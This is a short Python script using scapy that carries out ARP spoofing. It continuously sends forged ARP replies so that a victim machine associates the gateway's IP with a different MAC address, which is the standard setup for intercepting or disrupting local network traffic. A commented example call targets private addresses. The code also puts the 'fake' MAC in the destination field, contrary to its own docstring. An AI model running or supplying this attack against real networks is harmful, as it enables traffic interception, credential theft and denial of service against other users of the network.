from scapy.all import ARP, send
import time

def spoof_arp(victim_ip, fake_mac, gateway_ip):
    """
    Continuously sends forged ARP reply packets to a victim to impersonate the gateway.
    
    Parameters:
    - victim_ip (str): IP address of the target machine to poison.
    - fake_mac (str): MAC address to associate with the gateway IP (usually the attacker's MAC).
    - gateway_ip (str): IP address of the gateway to spoof.
    """
    packet = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=fake_mac)
    while True:
        send(packet, verbose=0)
        time.sleep(2)

# Example usage (uncomment to test in a controlled environment):
# spoof_arp("192.168.1.5", "ff:ff:ff:ff:ff:ff", "192.168.1.1")
